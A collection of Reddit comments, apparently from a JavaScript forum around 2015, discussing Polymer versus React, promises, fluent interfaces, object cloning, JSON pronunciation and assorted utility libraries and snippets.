Thanks! Yeah, now I see... I wasn’t familiar with all these techniques... So many different REQUIREs!.. And that interesting `{1:[function(require,module,exports){},{}]}` object is so-called [“integer-based labeling mechanism”](https://github.com/substack/browserify-handbook#user-content-compiler-pipeline)!
Good advice that I'll take in the first part! But from someone with 1 kid who just turned 6 you still won't have time to sit in front of the computer :(
Was curious myself, seems more like 2-3% based off a quick test http://jsperf.com/object-literal-vs-function-params , but I'd imagine its significant with enough frequencies. Chaining seems horrible, probably should be avoided without ES6. 
it's way better in chrome or whatever android's native browser is.
@homoiconic what's the best way to help with typos found in the 6th edition? I'm reading through it and noticed several typos - would love to help contribute!
I was so excited for this a year ago. 
I don't see much of a compelling programming model that enables the contruction of full applications (something you get with React) Why would I choose Polymer?
&gt; Sometimes they're great! Exactly, and that's the point of the post. To introduce the pattern. The article is **not** teaching anyone to turn every last function into a Fluent API.
Readability is almost always a trade-off against performance. I'd argue readability is generally more important, otherwise we'd all still program in assembly. Premature optimisation root of all evil yada yada.
Am I the only one who gets slightly nauseated when they read something like this? &gt;Polymer 1.0 has been rebuilt from the ground up for speed and efficiency. The new, leaner core library makes it easier than ever to make fast, beautiful, and interoperable web components.
IIRC Firefox doesn't have native support for things like Shadow DOM yet so it needs to be polyfilled, so that's probably the reason for the performance you're experiencing.
Looks lovely but after a few minutes playing with the demo it's still buggy.
&gt; Provides a single-file build for SystemJS of mixed-dependency module trees. Single file is easy. Automatic multiple file optimization is harder, and the only game in town is Webpack.
I was excited about the idea of Polymer (and web components in general) when I first heard of them, but I think that React does a much better job of approaching this. Does anyone have any arguments for using Polymer over React?
&gt; Does that mean web components have a permanent performance problem? These virtual DOMs get performance by minimising their interaction with the real DOM. A complex web component could also use the same tricks to minimises its interactions with the real DOM. 
You don't usually need to write a fluent interface if the code is simple enough. Fluent interfaces come into play when you need to do something with a lot of arguments or where the order of invocation matters. In fact, the article specifically mentions this: &gt; **One way** to make code readable is to have it flow like the natural language, describe the algorithm in a higher level of abstraction. ... &gt; While fluent interfaces might take a little bit of work to get right, they are an important **tool** in improving readability. Nowhere in the article it argues that fluent interfaces are the be-all and end-all of readable code. I can't defend a strawman.
Serialize seems to return a string like this: first=&amp;second=&amp;third=&amp;fourth=&amp;fifth=&amp;sixth=&amp;seventh= So you cannot really access it with [key], did you mean serializeArray() instead?
It sounds like you need to brush up on Javascript and Frameworks. Send me a message if you want to learn from the best resources.
Of course I did meant serializeArray(), thank you for pointing it out!
I think we should be careful here, since the first parameter is for the prototype object, not what we are copying from. 
Thanks for pointing me to the serialize functions though! I had no idea jQuery had those, really useful!
Isn't async hidden behind an experimental flag? I do not think that's safe to assume, if that's the case. To be more specific, since it's already part of the draft for ES 2016, it will make it into spec; however, it's reasonable to assume it will chnage. As of right now, they are trying to determine what the return type should be. 
 function FooClass() {} FooClass.prototype.bar = chainable(function(a, b) { console.log(a + b); }); // outputs: 3 7 11 var foo = new FooClass().bar(1, 2).bar(3, 4).bar(5, 6);
This might be interesting to read too: [Apple's consolidated feedback on Web Components](https://lists.w3.org/Archives/Public/public-webapps/2015AprJun/0225.html) 
Typical reddit link that shows nothing needed.
AFAICT, the DOM has been around long enough that I'm guessing (perhaps incorrectly) any perf optimizations possible would have done by now, at least in a perf-minded browser like Chrome. Hopefully Web Components bring about new perf-improvement opportunities? For instance, I could imagine a 'virtual dom' web component that you could place near the root of the page that would remove everything inside it from the real DOM, then manage them all as a virtual DOM, reflecting changes out in batches, minimizing DOM operations, etc, but much like projects that try to emulate the DOM in a canvas, it just seems like that would be a nightmare of back compatibility headaches AFAICT.
http://programmers.stackexchange.com/questions/225400/pros-and-cons-of-facebooks-react-vs-web-components-polymer
I've noticed a lot of people suggesting we should use Object.create to clone objects... something important to note is that the first argument, what we are trying to copy is for the prototype of the object, not the object we are copying from. That being said, we are not really copying any object with Object.create. This is what Object.assign is for, or alternatively we can use something like underscore's clone / jQuery's extend.
Just out of curiousity, is this the result of reading this book? https://pragprog.com/book/jbmaze/mazes-for-programmers Just asking because it's on my to-read list right now.
http://programmers.stackexchange.com/questions/225400/pros-and-cons-of-facebooks-react-vs-web-components-polymer has lots of info to me, the big appeal of React is "learn once, write anywhere". If react is close on performance I'll pick that over polymer so my team can easily do native ios/android (hopefully soon) vs having dedicated silo'd developers
The main difference is the DSL // developer experience. It's really your call, you have to try both to really know which one you like the most. Polymer required evergreen browsers, not sure about React but i think React supports way more browsers // browser versions than Polymer. Also, in Polymer, you can embed CSS styles, extends native elements and others stuff too, making the dom-elements kinda real components as we might know them in the future. React implementation is more like a "syntactic sugar", although it's really cool too and i really liked the way to compute things as i would have done it with pure javascript before actually returning the element. React also have a more "strict" way to do things, your components should contains specific methods and so on. I found Polymer more flexible on this point, but same goes here, some people like strict conventions, so that's on you. Oh, and by the way, with the 1.0, Polymer catch up with React speed, and now uses only webcomponents-lite (way lighter) and Shady DOM. So you shouldn't considerer speed when choosing, your app will run fast enough with both (when using each one correctly, of course). 
No because I understand that each promise is like an async `try` block.
Really, it's a good idea to handle catch regardless, never know when you might get an issue from a requested server.
It wasn't posted here, so... source: https://github.com/MartijnWelker/Watcher.js
Nope, you can develop without Node.JS, you have a JSXTransformer which can compile the JSX directly into the browser. However, for production, it really recommended (mandatory) to "compile" you project. But hey, that's just on production time so you shouldn't worry to much about that :) Polymer also need a pre-processor, but same goes here, you can dev right into your browser without node.js then "compile" it with vulcanize for production.
Polymer and React are related in the sense of some common ideas behind them. Polymer is more low-level and free-form and aligned with the new Web Components standards. Unlike Polymer, React additionally suggests how data should flow between components and introduces a few key functional-like concepts that simplify development of reusable components. A minus of React can be that it is not based on standards: its components will be usable only with React, although React leaves a large degree of freedom and you can use it with, for example, Backbone If you want to read more, I wrote an article that discusses how they relate to each other (sorry, a bit lengthy) https://smthngsmwhr.wordpress.com/2015/04/13/web-components-and-friends-react-angular-polymer/
Edit: This is worth it. ~~Not bad at all, the added verbosity I believe outweighs the lack of typing.~~ Now to combine this with some documentation system to generate docs from each function/object that's decorated.
I believe it does need a small explanation. Personally I didn't know what it was and had to dig around a bit. Look at the [jQuery](http://jquery.com/) page. If this was a post about jQuery reaching a new version and I didn't know what jQuery was I would've found out immediately.
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/programming] [JS ErrorTracker from RADjs. Now You can store application events(interface, network, custom events, launch timer, etc) and send it to your server](https://np.reddit.com/r/programming/comments/37pryg/js_errortracker_from_radjs_now_you_can_store/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger/wiki/) ^/ ^[Contact](/message/compose/?to=\/r\/TotesMessenger))* [](#bot)
Exactly. I should update the title to make this more explicit.
I find functional parameters just as readable, and 75% performance is a lot to lose for the benefit of readability. 
`node.js` is becoming more and more essential in the front-end developer's toolbag. I would urge you to explore node and perhaps something like Gulp (js task runner). Once you get accustomed to this kinda thing a whole new world of options is opened to you.
Yeah, it's worse than just an async try block. It's an async try block that by default 'pass's on exceptions. Why is that considered a reasonable default? 
How do I make a dropdown menu?
Liked you once for the solution but you deserve another for clearly noting that you haven't tested your proposed solution. 
These are ~~server-side~~ not client-side techs. React and Polymer are ~~front-end~~ client side frameworks.
I've never had issues with Polymer's documentation site, though they were suggesting the use of 0.5 while 0.9 was being developed. Now, it seems, 0.9 is out? https://blog.polymer-project.org/
did you install it locally (to a node_modules directory) or did you install it globally with the `-g` switch? Installing it locally does not add a command to your path variable. EDIT The project does not appear to have .bin path in the project so it may not be set up for global installation yet.
see yesterday's release thread http://www.reddit.com/r/javascript/comments/37mgpz/polymer_10_production_ready/
Works well-ish in chrome.
Polymer defines new DOM elements using standard in-built browser APIs (polyfilling if necessary). React is a strategy for assembling DOM elements together into UIs. Taking an analogy from chemistry, React is a clever way to create new molecules using only elements in the periodic table. Polymer adds new elements to the periodic table. (In that sense React should have been called Polymer and Polymer should have been called Atom.)
Looks cool! Just to confirm, a maze will always have one and only one path to completion?
Very cool, but the demo seemed kind of slow and the transitions were lanky
the chart really is incredible, its parabolic, makes you wonder if we're hitting "peak node" (similar to how ruby on rails was) parabolic curves don't stay parabolic forever
I don't know, it seems like node is going to be around awhile longer, javascript everywhere. I don't recall Ruby having these big companies behind it.
Taught myself and came up with this: http://codepen.io/ForScale/pen/PqWpQJ Not canvas, but still 2d collision detection.
You can use React without JSX, it's not hard and it helps you understand what is really going on behind the JSX curtain. Use `React.creatFactory` to turn your components into factory functions.
If you manually have to edit files, wouldn't that be more of a hassle?
That's a good idea! I'm actually working on that (dynamic images) = )
You can use React with vanilla JS, it's just a LOT more verbose.
Now make a maze runner library to solve it
Yep. What happened to semantic naming? Always having to translate every project's cute naming conventions into the de facto terminology we already use...
Yep! Feel free to share anything you may have learned!
I have been waiting for this moment for 2 years already. I am very thrilled that Polymer is just jQuery for Web Components smoothing over browser inconsistencies rather than forcing a full scale buy into a framework like React. When all anyone really wanted was Web Components with microservice oriented architecture.
Also see React using Polymer-esque webcomponents (Shadow DOM, Custom Elements, HTML Imports): https://github.com/Wildhoney/Maple.js
No, not always. In cases where a library is using hasOwnproperty on one of your objects, it will cause problems. 
Your post was caught by the spam filter because you used a URL-shortener; please don't host code as a download, if you want to share code, use something like jsfiddle.net, jsbin.com, codepen.io, etc.
I, for one, think the article is great, and wish more developers spent time thinking about how readable their code is.
You are absolutely correct and by "added verbosity" I meant &gt; 0 decorations. And I've edited my initial comment.
Another difference is that Polymer is useful for sprinkling components around a normal web page. It enhances normal webpages. You could use it to make nicer IMG tags or nicer buttons, as well as make more complicated components like shopping carts. Its more similar to Angular's directives in that respect. But you can also make whole sites using a component. React tends to favor building whole applications with it, often taking over the entire BODY. More single page apps. It is of course possible to insert some js that finds elements and mounts components on them, but this isn't normal practice. Also Polymer (Web Components) makes it easy to separate the css, js and html that a component needs. Each is in a separate file. It makes things smaller and more modular. At the moment this is inefficient. We favor build processes, concatenation, reducing the number of HTTP requests. But as HTTP2 comes into widespread usage that will change. There won't be a penalty for making extra requests. We can request many small resources and it will be even faster than today's concatenated blobs. **edit: if you downvote, leave a reply that indicates what you believe to be false. otherwise down voting a perfectly useful comment like this is just very poor reddiquette.**
In Firefox there's a Object.assign which is a perfect fit for cloning/extending. Still waiting it adopted by Chrome/node.js/etc.
Have you checked out [nodeschool.io](http://nodeschool.io/)? I'm playing through it right now, it's pretty fun.
Does the exception bubble up the call stack ?
Seems ironic that with Polymer you need to wait for more browser support to use it when it's supposed to let you use things that browsers don't yet support.
Been there a couple of times but didn't get the idea. All I saw was physical workshop locations to learn nodejs. any particular link or tutorial that I should follow?
A very good question, and one I'm not really qualified to answer in depth. Why have Gulp/Grunt/Brocolli at all? Why not just use Make? Jake? package.json? I spent a couple days stressing out about these options and others, then just chose something and ran with it. The choice itself wasn't so important to me. Getting a toolchain in place was.
The first one.
Hello! I was just happy to conceive of a way to do it and then put my plan in to action! I'm self-taught/still learning and I want to eventually start working with simple 2d platform type games. I feel the solution I have here is pretty straightforward, which I consider to be a good thing! Whenever I would search for how to achieve collision detection or ask about it in forums, people would provide somewhat convoluted approaches. I don't know... Can you *expand* on the expandability aspect you mention? What precisely do you mean and how might one go about creating a more expandable solution?
dunno. I just use _.template(). Simple, effective, doesn't require me to compile before seeing changes. Templates don't need to be complicated ;)
The downside is that functions would not be carried over 
You may be able to tell where people reside from the answers provided. I'm from up North, so "Jay-Saaaaaan".
React is strongly coupled with jsx and common.js which you need to utilize core parts of the react framework. While you can use react without either of these features it is very hard to make the framework work cleanly with other pieces of js without using them, especially in large applications. React requires initialization when its components are placed in the page. Polymer does not (because it uses native webcomponents that will render inert in most older browsers). React in the future will likely support webcomponents but does not now. Polymer is much more experimental (alpha quality software) framework. Unlike react it acts as more of a polyfill toolkit to allow modern browsers to support the webcomponents api. It allows one to truly pick and choose which parts of the framework to use and it is much more representative of what the web will look like 5-10 years from now. Both have drawbacks. Polymers is Google's approach to 'open source' which is to develop things internally and then periodically dump things on the community with little to no input breaking documentation and leaving the community completely unprepared for changes. React is a new framework but still relies on obsolete tech like jquery in its own examples. It doesn't yet have the ability to create true web components yet when it does will still likely rely on the inconsistent jsx rules to make this happen.
yea happened to me once -- i thought u actually had to DL them (they are called f12 developer tools) but i cant find the link u can try this: regedit HKEY_LOCAL_MACHINE &gt; SOFTWARE &gt; POLICIES &gt; MICROSOFT &gt; INTERNET EXPLORER &gt; IEDEVTOOLS and then modifying the DISABLED value to 0, which was 1 for me previously. from: http://stackoverflow.com/questions/852245/internet-explorer-8-developer-tools-not-displaying you can try this faq: https://support.microsoft.com/en-gb/kb/962963 your bug is probably string.trim() is missing from IE -doh- (haha jk that was my bug) -- maybe try a polyfill script?
Jason.
The concept of node workshops is nice but I didn't find most of the stuff there helpful in any way. Moreover a very little chunk of tutorials there related to the node development itself. Seems like a toy to me.
Richard.
I always pronounce it as Jay-sawn, and every developer I've worked with (southwest US) had the same pronunciation.
Jay's son
press x to jason
You are going to want to check your javascript console. Right click on the page and select inspect element, then at the top of that screen that pops up click the "console" tab and make sure to give the page a refresh. See any javascript errors? If not then I would suspect the CMS is being weird and not allowing the javascript to be inserted or inserting it in the wrong block of code (ala php error). 
I feel like every post about people not getting Promises is because they don't read the documentation on how they work.
How do you say "son", as in a boy?
Why do you feel it makes sense? To me, it's like if Python decided that unless you wrap your code with a `try-except`, it won't throw an error. You still want uncaught exceptions to bubble up, even if you forgot to catch it.
`hasOwnProperty` is not something you would use on a Map...
I say it like I'm French "J'son", then I never have to talk to anyone else about it so it really doesn't matter
Not according to Doug Crockford who should probably know... He then goes on to joke about it being pronounced with a French accent in a talk he did a while back, I'll try to dig it up and reply again. Great talk in general. Edit: here ya go https://www.youtube.com/watch?app=desktop&amp;persist_app=1&amp;v=zhVdWQWKRqM
I guess this is how you find out if you have an accent because "Jay-Saan" and "Jason" sound exactly the same to me.
It's dependent on the implementation of the runtime environment. Bluebird and Chrome both throw on uncaught rejections, and I think iojs might now too.
I've most definitely heard both from people well trenched in the industry. I prefer the pronouncing it like the name and think its overall been more common in my experience. I would certainly never correct someone over pronouncing it either way as its not very cut and dry which way is correct. 
Just curious, what does the "Max Branch Length" config item do?
This is sweet! I guess I come in at a close second ;) I created one for lodash functions. https://github.com/steelsojka/lodash-decorators *shameless plug* Still experimenting. This is a cool use of decorators! 
It's definitely a good start, but currently your positions are static. If you wanted to add an object (platform for example) it'd be much harder with static positioning.
That isn't a real question, is what you're missing. This is like when someone wants to "question" whether Barack Obama has governance experience. Just go look. . &gt; I am on the other end, as whole this thread, if i read it correctly - is about how closed source work. You do not. This thread is about Guy Bedford, creator of JSPM, an open source thing, SystemJS, an open source thing, and the ES6 Module Loader Polyfill, an open source thing, who has been working full time, unpaid, because it's not a company. You seem to just be trying to prove yourself right, instead of trying to figure out why you're so wrong that people don't want to talk to you. Then some random person with no apparent pubic surface or work whatsoever who doesn't know anything about open source decided to point to Substack, the person who gave us The Substack Pattern that everything modern in JS is written in, as an example of someone who doesn't get how open source works and doesn't know how to support others, and how they understood this much better than Substack ever would. So I pointed out how completely clueless he was. And you decided to join in. . &gt; you know something to back it up, but you wont show it :) That's because 1) I already did, 2) You're not even reading the thread, so I'd have to recite the entire thread and original post to you, and 3) It's not my job to explain reddit posts to you every time you are too lazy to keep up. 4) If you were less annoying, I might find it as sympathy in my heart, but 5) You're spending all your time talking about why you're correct, and pretending I have some obligation to explain the things you decline to just read to you. 6) If you can't read it when I said it last time, you won't be able to read it when I say it next time, besides, so it would be wasted work besides.
Nah, that would probably have made things easier though. I mostly just drew some mazes on graph paper and fiddled around
The I/O 2015 site might not be a good example. The tab widget is pretty glitchy and the site doesn't work at all in Opera. There are other strange graphical artifacts as well.
&gt; Just go look. Well, thats exactly something i want to look, i tried to find any non OS work from substack, but was unable to. &gt;This is like when someone wants to "question" whether Barack Obama has governance experience. To me it looks like question is if CEO of non-profit would be suitable for maximizing your output in for-profit company. &gt; You do not. his thread is about Guy Bedford, I meant that particular comment thread which started with substack claiming that i should quit my job and live in forest, because he can make all my job in 2 days and also because i am not enjoying it and has no input on how i build things. &gt;as an example of someone who doesn't get how open source works and doesn't know how to support others, and how they understood this much better than Substack ever would. Thats where we differ, i read this comment thread, and written my posts discussing closed source works, since his controversial statements are about job, and he states that OS and job are not compatible, so i assumed he is talking about closed source there. &gt; So I pointed out how completely clueless he was. Maybe i miss read that, and original reply was indeed targeted at substack engineering abilities and not his views on closed source software industry. If that the case, and you did not implied anything but that substack can write quality OS software, then there is no point to argue about, sorry for taking so much of your time :)
`co` for async flow control. As long as you're running io.js or otherwise enabling generators via transpilers or the `--harmony` flag.
You mean the people who say Jason right?
As it turns out, I don't know how to do that. Can you help me at all?I've tried jsfiddle.net but I don't know how to upload the assets and I don't know much about javascript. 
Ok, let's back up a tad. Which file did you modify (and at what lines) to add the buttons?
Sorry, i'm new to nodejs and the front-end development, and not so familar with such tools like bower, etc.. I use bower for package search/download only. Gulp and gulpfile can be removed in the future and make it a command line tool, but now i'm not goot at nodejs and the file system, stream, etc.. This is a convertor that let you write codes for both nodejs and browsers using the module style in nodejs, painess. 
Revenge is a dish best served over HTTP, apparently.
I added a game controller which I found here: https://github.com/austinhallock/html5-virtual-game-controller/blob/master/gamecontroller.min.js and I put it into the html file. I've tried to make a jsfiddle here https://jsfiddle.net/bongobong/880n3h7b/11/ Doesn't seem to have worked though given that it's causing my cpu to sky rocket! 
Ember.js
Ok, so it's most likely something to do with that game controller; have you tried playing with the various options, turning different things off and such? Otherwise, I'm not sure you'll get much help here, on account that you don't know javascript....we don't really take requests.
I use Lodash on the front-end as well. the _.template all by itself is wonderful (I'm not using react). Now, the rest of my bag of tricks: * JQuery (I support IE7 and up) * Twitter Bootstrap * D3 * date.js (like MomentJS) * Farbtastic (color picker) * JQuery.FileUpload * Flot (charting) * Markdown.js * Hammer.js (better touch detection) * Ace (editor) * PDF.js (display pdfs in browser)
That's just your buzzword detector coming off. =)
Superagent is a fairly good library for making http requests on the client if that's what you are looking for. I've used it with react a bit but it doesn't really matter which library you use as long as you keep it decoupled from your components. 
Honestly none. I find that general purpose utilities often mask what's happen in code, and it becomes difficult to reason about and maintain. Instead of just understanding the JavaScript and DOM APIs, you must also understand any number of arbitrary APIs, all with their own constructs and ways of use. Now, for specific tasks, like graphing, canvas rendering, single-page applications, etc, there are a variety of libraries I find useful. pixi.js and angular come to mind.
You comment was caught by the spam filter because you used a URL-shortener; please repost without, thanks!
jason
Co is amazing. Every since I started working with asyncio in python I dreaded moving back to javascript for async work; until co came out that is.
Che
Why not just pick the pronunciation that ISN'T going to be confused with an actual person's name? Are people really that stubborn to avoid the practical choice? 
I seem to get everything I need out of Jasmine and it's various templates, such as coverage reports in standard formats (thus easy to integrate with Eclipse, Sonar, etc), failing builds if tests don't pass (grunt jasmine plugin, presumably the same with Gulp), and generated html page to do testing effortlessly in browsers. So what does Karma give me that I don't already have, or what features of Jasmine does it improve upon that would justify the effort to integrate it into something that already works?
I honestly find Webpack absolutely terrible. The idea is amazing but the execution kills me. It's constant errors, insanely confusing, extremely complex for what it is and often absolutely slow as a dog that ain't been fed in some days. 
ubject uriented prugramming
It's funny this got down voted because this is the only viable option for objects with reference type properties (other objects). All the library clones are shallow or only go down an arbitrary number of levels so changing a reference value in the base will affect the clone. Obviously it's not the right solution for all cases, but there are times when it's the best option we have right now. 
Next we'll start calling it Jiff because the creator says as much...
http://sugarjs.com/ I use the extensions to String, Object, Function, Number, and Array Date and RegExp not so much, probably just because of the kind of work I do. 
Project FI uses Angular (check the source-code) Material design != Polymer guys !
I'm becoming less and less convinced of that. Templates should be programmable, like every other layer, but constrained, like every other layer. But I don't want the loss of control that angular forces on you. I like _.template because I get the full power of Javascript from inside the template (for example &lt;% if (callmyfunction()) { %&gt; render html &lt;% } %&gt; ) Models should not know about the repository. The repository should not know about the view. The view should not know about the respository. The view is a collection of module and components with layout. Modules and components are mini-controllers with views and repository access.
Yup. Async/await is much better syntax for asynchronous flow. Even python [added it](https://www.python.org/dev/peps/pep-0492/).
Just side note, react is not coupled to common js at all. Lots of people use es6 modules with babel with it and it can be included globally the old fashioned way like anything else (or from a cdn even there is an in browser jsx transformer as well) Most people just use cjs because... Well why wouldn't you? 
Yes I know. I could've sworn I remember checking the source when it came out and it was on Polymer. I know there are others.
Fonckshunal progg-ramming
Jace-On
It turns out they do! I wonder if this is a recent change? They still can cause trouble though if you don't use native promises, or if you're using them on Node.js, or if you're using them via a polyfill instead of native promises. The environment that caused me a lot of pain was node.
How do you differentiate it from [Gson](https://code.google.com/p/google-gson/)?
Hay Son?
Deruuulo
Recently I've been primarily using/writing my own (learning!), [ajax.js](https://github.com/hansolo669/ajax.js) is the most complete (though I think promises may not be implemented correctly). Vanilla JS suffices for nearly everything on the frontend; I don't have a consistent backend JS stack at the moment.
I like lodash's templates in theory, but the specific glyphs they use annoy me. I wish it used `{{ ... }}` or something like that instead of `&lt;% ... %&gt;`. They just don't stand out well in the HTML to me. :(
I think it's just a list of someone's favorite Javascript resources. I'm not sure what you're asking for.
Thanks! I compare some apps made wit RN and NS, and the ones using RN looks very impressive. And, as you say, Facebook support is a big deal. Thanks for your answer!
Underscore for map, reduce and pluck is a joy. I'm on the Angular boat. Momentjs. async on the backend, $q up front. Using d3.js makes u feel like a badass.
How does it stack up with immutablejs?
Can you show us an example of a relationship graph?
&gt;That is the guy lol. And he can't be wrong he invented the term. Actually the person who invented the word doesn't get decide how it's pronounced. 
In Australian both those words sound the same.
Jai-Sone
http://i.imgur.com/wj6SXYx.jpg for better quality cause the script didnt get posted well
The thing to think about is "what do you want to test?". On a first look I'd say this test here is testing two things: The first thing it (seems to) tests is that `Client#init` calls `LIB#Foo` with the correct options. It also tests that whatever `LIB#Foo` gives back, gets assigned to `Client#foo`. You _need_ `spyFoo` to test the first thing. And you _need_ `fakeFoo` to test the second one. So, I'm afraid you cannot avoid having those _if you want to test that_. On the other hand, this code... var Client = { init: function init(options) { this.foo = LIB.Foo({}); } } ...seems to pass this particular test without difficulties, so it may be that you're not testing the right thing.
Hey, maybe I should include the `core.is.obj` and `core.is.str`!? core.is = {}; core.is.str = function(s, bDisallowNullString) { return (typeof s == 'string' || s instanceof String &amp;&amp; (!bDisallowNullString || s !== '') ); }; core.is.fn = function(f) { return (Object.prototype.toString.call(f) === '[object Function]'); }; core.is.obj = function(o) { return (o &amp;&amp; o === Object(o) &amp;&amp; !core.is.fn(o)); };
Personally I mainly use vanilla JS with my own reusable modules. XMLHttpRequest isn't *that* hard to use. The one change I've made recently is that I've switched to React for the view layer. For Flux I use EventEmitter and Facebook's dispatcher. 
Like Daniel-san, but with a J.
AHHHH. Sorry for my mistakes! Just started learning CIS at college and currently having a difficult time learning JS. I forgot to add the Random JS on accident and all those mistakes. Thanks so much for the help! and will take your information on how to upload things for any future questions! THANK YOU SO MUCH
I'd like to add one thing - I'm not particularly committed to JQuery-UI, and would be more than willing to ditch it. The replacement should be something that is not too prescriptive about building the layout, because now I'm doing a few odd things with it. I found a few replacement libraries, and some were really nice looking, but sometimes they tended to be abandoned efforts - this seems to happen a lot in the Javascript world. And some others tried to replicate the Bootstrap model of offering you very nice, very opinionated UI layout.
Do you mean that he can't make you say it a certain way? Because as far as authoritatively stating how a word *should* be pronounced, I think he's not to be dismissed.
A good article, but ... being fluent is great, personally I prefer to see code which is *intelligible* to the broadest potential audience, something DSLs usually hinder. To take your examples, what if someones mother-tongue is SVO or VSO? What if they primarily code in another language and visit JS only on occasion? How "fluent" is your DSL to them? Might the "fluent" interface be: after(1).into([1,3]).insert(2)? IMO the most fluent example you provided was the one that is the most simple: insert({value: 2, into: [1, 3], after: 1}); Basic javascript, no ordering dependencies, simple to document ... and if you run it through Google translate you will find it is handled better than the "fluent" version.
That's awesome! It solves so many problems which I had to solve in the past. Thank you :)
Exactly, pronunciation is not dictated by the person who coined the word. People pronounce things the way they want but to deviate from the common pronunciation because the person who coined the term says different doesn't make sense. Plus the author has to be reasonable in the pronunciation. Calling it "Jason" is stupid since that is a common name and has caused confusion already. Pronouncing it "jay-son" or something similar makes more sense hence why most people pronounce that way and the author can scream and shout that it isn't correct but people won't care and they shouldn't. Web developers can be very pedantic about this stuff, like the people that insist Sass be written like so, with the capitalized "s" and the rest lower case. Like anyone gives a damn if its written sass, Sass or SASS. 
Try /r/netsec
And Raymond Hettinger of the Python community: https://youtu.be/wf-BqAjZb8M?t=1081 (Really good talk, by the way, if you're interested in writing Python code. Tbh, what with the changes in JS to allow more "pythonic" styles like iterators for collections, it might be interesting otherwise.)
Looks kind of neat. Does it do lazy evaluation?
&gt; var random_images_array = ['gfycatname',; This is one of the causes, change it to something like &gt; var random_images_array = ['image1','image2']; Also, you need to properly escape this, currently you have inserted an undefined variable &gt;var imgStr= '&lt;div class='gfyitem' Change it to something like &gt;var imgStr= '&lt;div class="gfyitem" id="blabla" &gt; &lt;/div&gt;' Also be sure to add &gt;console.log(imgStr); to your getRandomImage() function, then you'll easily see if it has a bug in it
&gt;(because they get slow when you plot over 100,000 points) That worries me a bit haha. In what timeframe you want to draw those 100k of points? Try canvas, its VERY easy to use, but might not suit your "need for speed". https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Pixel_manipulation_with_canvas Otherwise for speed you need to use some kind of library that uses webgl, but as far as I know most of them are specialized in games instead of drawing pixels as fast as possible http://www.pixijs.com/
haha it's visualizing the stockmarket ... and it's crazy... 
And C# created it! Way to go Microsoft.
[Transparency](http://leonidas.github.io/transparency/) is great and does exactly what I expect from a templating library, I use it more and more now. The others I rely on have mostly been mentioned (Moment, Leaflet, jQuery, Modernizr).
Regarding concatenation or long string continuation, I much prefer this method (which is essentially the same as 4.II. but without the extra pushes): ``` var whatever = [ 'Hello ', 'stranger.' ].join(''); ``` This is much more advantageous when working with template strings, like for React or Angular as you can add line breaks and indents without impacting the string.
just some trick, in fact, It also use builtin `fs.readFile` to write file
Jay-ass-on
getDay() or use a library like moment.js to make it easier.
&gt; React is strongly coupled with jsx and common.js which you need to utilize core parts of the react framework. It is possible to use React with AMD modules and without Browserify.
You would create a new Date object using the current year and month, then call [getDay()](http://www.w3schools.com/jsref/jsref_getDay.asp) to get the day of the week from 0-6. E.g. var now = new Date(); var startOfMonth = new Date(now.getFullYear(), now.getMonth()); var day = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'][startOfMonth.getDay()]; 
I also had the impression that at the moment React provides more means to make the actual development easier. Polymer has a few things to offer as well, like advanced templating https://www.polymer-project.org/0.5/docs/polymer/template.html and some useful mixins and elements https://www.polymer-project.org/0.5/components/core-elements/demo.html, but still it feels a bit more low-level.
I wrote this article because I wanted to have Travis CI test pull requests and other code in my Github repository. Karma helps you with the Travis + Jasmine + browser integration 
codecademy and code wars are pretty good. 
[`.substr`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/substr)? `.test`? fail. EDIT: [`RegExp.test`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test) (toopid bain)
A saved html file with some js / Console log in it? Dobleclick to open, edit file or use dev tools. Or let them create a basic html5 file with a link to file. Could be part of first lecture about how and where javascript can be run
To make it a little more robust and address the cheat you introduced, I would use a random object generator to create that options var that is passed in from the test. Makes it harder to do things like that by accident, or on purpose.
So I had a few If statements that open up into For loops, and the parameters for the If statements are what month it is. There was an If statement for February, months with 30 days, and months with 31 dayas. However, I think I can get rid of all those If statements and leave just one For loop if I can have a var that is daysPerMonth. How can I use Date() to find the number of days in the current month?
1) how is this better than queryselector? 2) the idea of accessing comments from JavaScript is Very Wrong for so many reasons.
I much prefer string concatenation, since uglifiers will automatically detect concatenated string literals as equivalent to a single string literal, e.g. `'a' + 'b'` minifies as `'ab'`. I've been steeped in React code for hours a day over the past year, and I find I use the array method only when I need to represent the same data differently in different views, e.g. var name = 'jkoudys' var pageTitle = ['My', 'name', 'is', name]; return &lt;section id={pageTitle.join('')}&gt; &lt;a href={'/foo/bar' + pageTitle.join('_')}&gt;{pageTitle.join(' ')}&lt;/a&gt; &lt;/section&gt;;
Yeah, but in general I find 'going against the grain' often leads to unexpected hassles. E.g. at work, we have a convention that all variables and properties other than functions/subroutines/etc should be `snake_cased`, and that's been a pain in the ass when we started implementing Angular since Angular infers a lot of things based on industry-standard `camelCase`. It's great that lodash lets you change it, but I suspect I'd run into even more problems down the road if I got used to using it that way.
The answer is "use a library", but just in case you'd like to know algorithmically how you do it: year = 2015; day = 30; month = 5; daysAtMonth = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334]; // Add up days/year + leap days - leap exceptions + leap double exception // + days in months + current day n = year * 365 + Math.floor(year / 4) - Math.floor(year / 100) + Math.floor(year / 400) + daysAtMonth[month-1] + day; // If this is a leap year and we haven't hit March, subtract out // the leap day we added above if (month &lt; 3 &amp;&amp; ((year % 4) == 0 &amp;&amp; (! (year % 100) == 0 || (year % 400) == 0))) { --n; } // 0 = Sunday dow = (n-1) % 7; console.log(dow); In essence, you're just multiplying out the number of days and then doing a modulo 7 to get the day of the week (with an offset to put zero on the day that you want). The tricky part is knowing how leap years work, which is leap year every four year, except no leap if it's divisible by 100, but yes leap if it's divisible by 400. So 1900 was not a leap year, but 2000 was. If you're confused on how it works, feel free to ask questions. Date arithmetic is good to understand.
I'm of the camp that would happily do away with both `substr()` and `substring()` entirely if it were possible. `slice()` is the most consistent syntax to use.
new version of Famous, Meteor, R
Did you read the documentation for [getDay()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/getDay)? FWIW getDay() is my first several results when I google "determine day of week javascript".
